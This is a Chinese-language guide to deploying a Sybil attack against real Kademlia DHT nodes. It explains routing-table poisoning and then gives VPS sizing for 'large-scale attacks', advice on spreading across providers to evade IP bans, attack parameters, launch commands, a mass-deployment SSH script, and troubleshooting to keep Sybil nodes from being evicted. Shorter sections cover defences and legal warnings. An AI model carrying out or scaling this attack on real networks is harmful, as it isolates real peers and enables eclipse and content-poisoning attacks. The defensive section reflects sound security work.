# DHT女巫攻击 - 真实网络部署指南

## ? 目录
1. [攻击原理](#攻击原理)
2. [真实网络部署方案](#真实网络部署方案)
3. [分布式攻击架构](#分布式攻击架构)
4. [部署步骤](#部署步骤)
5. [攻击效果验证](#攻击效果验证)
6. [防御建议](#防御建议)
7. [法律与伦理](#法律与伦理)

---

## ? 攻击原理

### DHT女巫攻击 (Sybil Attack on DHT)

**目标**: 污染目标节点的Kademlia路由表，控制其网络视图

**原理**:
```
Kademlia路由表结构:
- 每个节点维护 32个 K-bucket (对于32位NodeID)
- 每个bucket最多存储 K个节点 (通常 K=8 或 K=20)
- Bucket i 存储距离在 [2^i, 2^(i+1)) 范围内的节点

女巫攻击策略:
1. 获取目标节点的NodeID
2. 计算目标的32个bucket对应的距离范围
3. 为每个bucket生成 8个 精确落入该范围的NodeID
4. 启动 256个攻击节点 (32 buckets × 8 nodes)
5. 持续向目标发送PING保持活性
6. 目标的路由表被攻击节点填满
```

**影响**:
- ? 目标节点的`FIND_NODE`查询只会返回攻击者控制的节点
- ? 目标节点无法找到真实的合法节点
- ? 目标节点被隔离在攻击者构建的"虚假网络"中
- ? 可以实施内容投毒、日食攻击等进一步攻击

---

## ? 真实网络部署方案

### 方案对比

| 方案 | 环境 | 节点数 | 成本 | 攻击成功率 | 适用场景 |
|------|------|--------|------|-----------|---------|
| **Docker单容器** | Docker内部 | 256 | 极低 | 高 (仅测试) | 本地学习、算法验证 |
| **Docker多容器** | Docker网络 | 256 | 低 | 高 (仅测试) | 实验室研究、课程演示 |
| **分布式VPS** | 真实互联网 | 256+ | 中高 | 高 | 授权渗透测试 |
| **僵尸网络** | 全球分布 | 数千+ | 极高/违法 | 极高 | ?? 非法，禁止使用 |

---

## ?? 分布式攻击架构

### 架构设计

```
                    ? 目标DHT节点
                    (192.168.1.100:8000)
                           ↑
        ┌──────────────────┼──────────────────┐
        │                  │                  │
    VPS-1              VPS-2  ...         VPS-10
  (25 nodes)        (25 nodes)          (25 nodes)
    ↓                  ↓                    ↓
 Bucket 0-2        Bucket 3-5  ...    Bucket 29-31
 每个bucket:         每个bucket:          每个bucket:
  8个节点            8个节点              8个节点
```

### 资源需求

**最小配置** (适用于测试网络):
- **服务器数量**: 10台VPS
- **每台配置**: 1核CPU, 1GB内存, 1Mbps带宽
- **总成本**: ~$50-100/月 (使用廉价VPS)

**推荐配置** (适用于大规模攻击):
- **服务器数量**: 20-50台VPS
- **每台配置**: 2核CPU, 2GB内存, 10Mbps带宽
- **总成本**: ~$200-500/月

**地理分布**:
- 建议选择不同地区的VPS (美国、欧洲、亚洲)
- 避免同一数据中心的IP被批量封禁
- 使用不同的云服务商 (AWS, DigitalOcean, Vultr, Linode)

---

## ? 部署步骤

### 步骤1: 准备VPS服务器

```bash
# 选择云服务商并创建10台VPS
# 推荐配置:
# - OS: Ubuntu 22.04 LTS
# - CPU: 1 vCore
# - RAM: 1GB
# - 网络: 1Gbps
# - 存储: 25GB SSD

# 服务器列表示例:
VPS-1: 45.76.123.10   (美国东海岸)
VPS-2: 139.180.156.20 (新加坡)
VPS-3: 207.148.82.30  (日本)
VPS-4: 149.28.94.40   (德国)
VPS-5: 95.179.178.50  (英国)
... (共10台)
```

### 步骤2: 环境初始化

在**每台VPS**上执行:

```bash
# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装Python 3.10+
sudo apt install -y python3 python3-pip git

# 克隆项目代码
git clone https://github.com/your-repo/dht-sybil-attack.git
cd dht-sybil-attack

# 安装依赖
pip3 install kademlia asyncio

# 或者从你的项目复制文件
scp -r /path/to/docker-cluster-10 root@VPS-IP:/root/
```

### 步骤3: 配置攻击参数

编辑 `distributed_sybil.py`:

```python
# --- 攻击配置 ---
TARGET_HOSTNAME = "目标节点的公网IP或域名"  # 修改为实际目标
TARGET_PORT = 8000                       # 目标DHT端口

# 分布式配置
TOTAL_SERVERS = 10          # 总共使用的VPS数量
NODES_PER_SERVER = 26       # 每台VPS生成的节点数 (256/10 ≈ 26)
START_PORT = 9000           # 起始端口 (每台VPS会自动偏移)
```

### 步骤4: 启动分布式攻击

在**每台VPS**上执行 (注意修改服务器编号):

```bash
# VPS-1
python3 distributed_sybil.py 0

# VPS-2
python3 distributed_sybil.py 1

# VPS-3
python3 distributed_sybil.py 2

# ... 依此类推

# VPS-10
python3 distributed_sybil.py 9
```

**使用screen/tmux保持后台运行**:

```bash
# 安装screen
sudo apt install -y screen

# 启动screen会话
screen -S sybil-attack

# 运行攻击脚本
python3 distributed_sybil.py 0

# 按 Ctrl+A, D 分离会话
# 重新连接: screen -r sybil-attack
```

### 步骤5: 自动化批量部署 (可选)

创建 `deploy.sh` 脚本:

```bash
#!/bin/bash

# VPS列表
VPS_IPS=(
    "45.76.123.10"
    "139.180.156.20"
    "207.148.82.30"
    # ... 添加所有VPS IP
)

# SSH密钥路径
SSH_KEY="/path/to/your/ssh_key.pem"

# 循环部署
for i in "${!VPS_IPS[@]}"; do
    VPS_IP="${VPS_IPS[$i]}"
    echo "? Deploying to VPS-$i ($VPS_IP)..."
    
    # 上传代码
    scp -i $SSH_KEY -r distributed_sybil.py kademlia/ root@$VPS_IP:/root/
    
    # 远程启动
    ssh -i $SSH_KEY root@$VPS_IP "screen -dmS sybil python3 /root/distributed_sybil.py $i"
    
    echo "? VPS-$i deployed"
    sleep 2
done

echo "? All VPS deployed successfully!"
```

运行部署:
```bash
chmod +x deploy.sh
./deploy.sh
```

---

## ? 攻击效果验证

### 方法1: 查看目标节点路由表

如果你有目标节点的访问权限:

```python
# 在目标节点上运行
python3 verify_sybil_attack.py
```

输出示例:
```
? 女巫攻击效果验证
========================================
测试节点 ID: 0x00623457
目标节点: node-1 (172.25.0.2:8000)

? 测试 FIND_NODE 查询
========================================
查询目标 ID: 0x00000000
返回节点数量: 8

节点分析:
  合法节点: 0 个 (0.0%)
  女巫节点: 8 个 (100.0%)  ?? 路由表已被完全污染

女巫节点列表:
  1. 0x80623457 - 172.25.0.3:9000  [距离: 0x80000000]
  2. 0x40623457 - 172.25.0.3:9001  [距离: 0x40000000]
  ...

?? 攻击成功！目标节点的路由表已被女巫节点占据
```

### 方法2: 外部探测

```python
# 从外部节点探测
import asyncio
from kademlia.node import Node

async def probe_target():
    # 创建探测节点
    probe = Node(0x12345678, 8888)
    await probe.start()
    
    # 向目标发送FIND_NODE
    target = {'id': 0, 'ip': 'target-ip', 'port': 8000}
    response = await probe.protocol._send_request(
        (target['ip'], target['port']),
        'FIND_NODE',
        {'target_id': 0x00000000}
    )
    
    # 分析返回的节点
    if response and 'nodes' in response:
        print(f"目标返回了 {len(response['nodes'])} 个节点")
        for node in response['nodes']:
            print(f"  - ID: {node['id']:08x}, IP: {node['ip']}")

asyncio.run(probe_target())
```

### 方法3: 网络流量分析

```bash
# 在目标节点上抓包
sudo tcpdump -i any udp port 8000 -n -c 100

# 观察大量来自不同IP但同一NodeID模式的PING包
```

---

## ?? 防御建议

### 针对DHT网络运营者

1. **NodeID绑定IP地址** (BEP 42标准)
   ```python
   # NodeID必须基于IP地址生成
   node_id = hash(ip_address + secret) & 0xFFFFFF00 | random_byte
   ```

2. **限制单IP的节点数量**
   ```python
   # 每个IP最多允许2-3个NodeID
   if count_nodes_from_ip(ip) > 3:
       reject_node()
   ```

3. **增加节点验证**
   ```python
   # 要求节点完成工作量证明
   def verify_node(node):
       challenge = random.random()
       proof = node.solve_challenge(challenge)
       return verify_proof(proof, difficulty=20)
   ```

4. **路由表多样性检查**
   ```python
   # 拒绝填满bucket的单一来源
   if all_nodes_from_same_subnet(bucket):
       evict_suspicious_nodes()
   ```

### 针对DHT客户端

1. **使用多个bootstrap节点**
   ```python
   bootstrap_nodes = [
       'dht1.example.com:6881',
       'dht2.example.com:6881',
       'dht3.example.com:6881',
   ]
   ```

2. **定期刷新路由表**
   ```python
   # 每小时重新发现节点
   asyncio.create_task(refresh_routing_table())
   ```

3. **交叉验证关键操作**
   ```python
   # 从多个节点查询同一内容
   results = await query_multiple_nodes(content_hash, count=5)
   verified_result = majority_vote(results)
   ```

---

## ?? 法律与伦理

### ?? 警告

**在真实网络上进行未授权的女巫攻击是违法的！**

根据《中华人民共和国网络安全法》第27条和《计算机信息网络国际联网安全保护管理办法》:
- 未经授权访问或破坏计算机网络属于犯罪行为
- 可能面临刑事处罚和民事赔偿

### ? 合法使用场景

1. **自有测试网络**
   - 在完全自己控制的网络环境中测试
   - 不连接到公共DHT网络

2. **授权渗透测试**
   - 获得目标组织的书面授权
   - 在指定时间和范围内进行测试
   - 提交详细的测试报告

3. **学术研究**
   - 在隔离的实验环境中进行
   - 发表论文前进行伦理审查
   - 不公开可直接使用的攻击代码

4. **漏洞赏金计划**
   - 参与官方的安全测试项目
   - 遵守项目规则和范围
   - 负责任地披露漏洞

### ? 授权模板

```
安全测试授权书

授权方: [公司/组织名称]
受权方: [测试人员姓名]
测试目标: [具体的IP地址或域名]
测试范围: DHT女巫攻击测试
测试时间: [起始日期] 至 [结束日期]
测试约束:
  1. 不得影响生产环境
  2. 不得窃取或泄露用户数据
  3. 测试完成后提交报告

授权方签字: ___________  日期: ___________
受权方签字: ___________  日期: ___________
```

---

## ? 故障排查

### 问题1: 攻击节点无法连接到目标

**原因**:
- 目标节点防火墙阻止UDP流量
- 目标节点不在公网或NAT后面
- 目标节点已下线

**解决**:
```bash
# 测试连通性
nc -u -v target-ip 8000

# 检查端口开放
nmap -sU -p 8000 target-ip
```

### 问题2: 攻击节点被目标剔除

**原因**:
- NodeID生成算法错误,未落入正确的bucket
- PING频率过低,被判定为离线

**解决**:
```python
# 增加PING频率
await asyncio.sleep(10)  # 改为10秒一次

# 验证NodeID计算
distance = target_id ^ attack_id
bucket_index = distance.bit_length() - 1
print(f"NodeID {attack_id:08x} 应落入 Bucket {bucket_index}")
```

### 问题3: VPS资源耗尽

**原因**:
- 每台VPS生成节点过多
- 内存/带宽不足

**解决**:
```bash
# 监控资源使用
htop
iftop

# 减少每台VPS的节点数
NODES_PER_SERVER = 15  # 从26降低到15
```

---

## ? 参考资料

1. **Kademlia协议**: [原始论文](https://pdos.csail.mit.edu/~petar/papers/maymounkov-kademlia-lncs.pdf)
2. **BEP 42**: [NodeID限制规范](http://www.bittorrent.org/beps/bep_0042.html)
3. **S/Kademlia**: [安全增强方案](https://www.researchgate.net/publication/4319659_SKademlia_A_practicable_approach_towards_secure_key-based_routing)
4. **女巫攻击防御**: [Survey Paper](https://ieeexplore.ieee.org/document/8967424)

---

## ? 技术支持

如有问题，请联系:
- Email: security@example.com
- Issue: https://github.com/your-repo/issues

**请负责任地使用此技术！** ??
